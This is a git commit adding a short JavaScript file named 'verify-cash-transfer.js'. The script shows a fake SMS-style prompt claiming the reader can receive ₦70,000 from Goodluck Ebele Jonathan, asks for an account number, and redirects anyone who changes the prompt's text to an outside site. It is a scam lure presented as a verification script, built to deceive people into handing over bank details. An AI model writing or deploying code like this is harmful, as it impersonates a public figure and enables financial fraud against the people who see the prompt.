eb74b2cdde7af97a338ead6b44800e239204de02
newblog13 <sweet16guyz@gmail.com>
2026-05-08 05:53:13 +0100

    Create verify-cash-transfer.js

---
+++ verify-cash-transfer.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦70,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦70,000 From Goodluck Ebele Jonathan, click OK to Enter Your Acc. Number','WITHDRAW ₦70,000');
+if (password != 'WITHDRAW ₦70,000') {
+location.href='https://phivez.org/goodluck';
+}
